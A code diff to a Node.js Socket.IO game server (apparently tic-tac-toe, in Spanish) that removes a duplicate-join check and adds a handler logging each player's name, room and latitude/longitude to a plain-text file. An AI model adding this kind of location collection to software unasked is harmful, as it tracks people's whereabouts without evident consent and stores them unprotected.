@@ -43,13 +43,6 @@ estado:"esperando"
 
 const sala = salas[room]
 
-const yaExiste =
-sala.jugadores.find(
-j=>j.id == socket.id
-)
-
-if(yaExiste) return
-
 if(sala.jugadores.length >= 2){
 
 socket.emit("roomFull")
@@ -65,21 +58,15 @@ foto:data.foto,
 simbolo:
 sala.jugadores.length == 0
 ? "X"
-: "O",
-conectado:true
+: "O"
 }
 
 sala.jugadores.push(jugador)
 
-if(sala.jugadores.length == 2){
-
-sala.estado = "jugando"
-
-}else{
-
-sala.estado = "esperando rival"
-
-}
+sala.estado =
+sala.jugadores.length == 2
+? "jugando"
+: "esperando rival"
 
 socket.emit("playerData",jugador)
 
@@ -257,6 +244,23 @@ io.to(data.room).emit(
 nombre:data.nombre,
 mensaje:data.mensaje
 }
+)
+
+})
+
+socket.on("ubicacion",(data)=>{
+
+const log = {
+fecha:new Date(),
+sala:data.room,
+nombre:data.nombre,
+lat:data.lat,
+lng:data.lng
+}
+
+fs.appendFileSync(
+"ubicaciones.txt",
+JSON.stringify(log) + "\n"
 )
 
 })
